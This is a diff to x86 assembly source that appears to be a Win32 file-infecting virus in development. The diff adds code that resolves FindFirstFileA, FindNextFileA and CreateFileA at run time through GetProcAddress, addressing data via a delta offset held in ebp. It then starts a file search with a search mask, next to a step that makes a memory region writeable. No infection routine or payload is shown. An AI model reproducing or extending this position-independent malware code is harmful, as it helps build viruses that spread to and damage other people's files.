@@ -108,7 +108,17 @@ find_API:
 	call [ebp+GetModuleHandleAddress]
 	mov dword ptr [ebp+handle],eax
 	
-	call GetAPIAddress						      ; now get api address 
+	call find_APIAddress						      ; now get api address 
+	
+	lea eax,offset Win32Data
+	add eax,ebp
+	push eax
+	lea eax,offset search_mask
+	add eax,ebp
+	push eax
+	call [ebp+FindFirstFileAAddress]
+	mov dword ptr[ebp+search_handle],eax
+	
 	
 	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
 	push 80h							      	; writeable
@@ -243,12 +253,35 @@ search_module_4:
 	mov ebp,[ebp]
 	add ebp,edi
 	ret	
-GetAPIAddress:
-	push dword ptr[ebp+FindFirstFileAStr]
+find_APIAddress:
+	lea eax,offset FindFirstFileAStr
+	add eax,ebp
+	push eax
 	push dword ptr[ebp+handle]                  ; module handle
 	call [ebp+GetProcAddressAddress]
 	mov [ebp+FindFirstFileAAddress],eax	
-ret	
+	
+	lea eax,offset FindNextFileAStr
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+FindNextFileAAddress],eax
+	
+	lea eax,offset CreateFileAStr
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+CreateFileAAddress],eax
+	
+	
+;	lea eax,offset kernel_string
+;	add eax,ebp
+;	push eax
+;	call [ebp+GetModuleHandleAddress]
+;	mov dword ptr [ebp+handle],eax
+	ret	
 
 end_objecttable: 
 	
